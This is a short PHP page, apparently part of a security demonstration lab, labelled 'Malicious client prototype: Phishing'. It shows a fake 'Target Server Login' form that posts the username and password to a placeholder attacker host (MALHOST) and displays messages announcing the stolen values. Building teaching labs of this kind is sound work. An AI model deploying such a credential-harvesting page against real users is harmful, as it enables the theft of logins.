<?php
include('../declare.php');

$title = "Malicious client prototype: Phishing";
include('../inc/header.php');

$errors = array();
if (isset($_REQUEST['username'])) {
  $errors[] = 'Stole your user name: '.$_REQUEST['username'];
}
if (isset($_REQUEST['password'])) {
  $errors[] = 'Stole your password: '.$_REQUEST['password'];
}

$requesturi = $_SERVER['REQUEST_URI'];
if (substr($requesturi, 0, 1) === '/') {
  $requesturi = substr($requesturi, 1);
}
$action = MALHOST.$requesturi;

?>
<h1>Target Server Login</h1>
<p id="error">
<?=implode('<br/>', $errors)?>
</p>
<form name="login" method="post" action="<?=$action?>">
<div class="label">
<label for="username">Username:</label>
</div>
<input class="field" id="username" name="username" type="text"></input>
<br/>
<div class="label">
<label for="password">Password:</label>
</div>
<input class="field" id="password" name="password" type="password"></input>
<br/>
<input class="btn" name="login" type="submit" value="Log in"></input>
<br/>
</form>
<?
$links = array(
  'phishing start' => TGTHOST."phishing/start",
);
include('../inc/footer.php');
?>
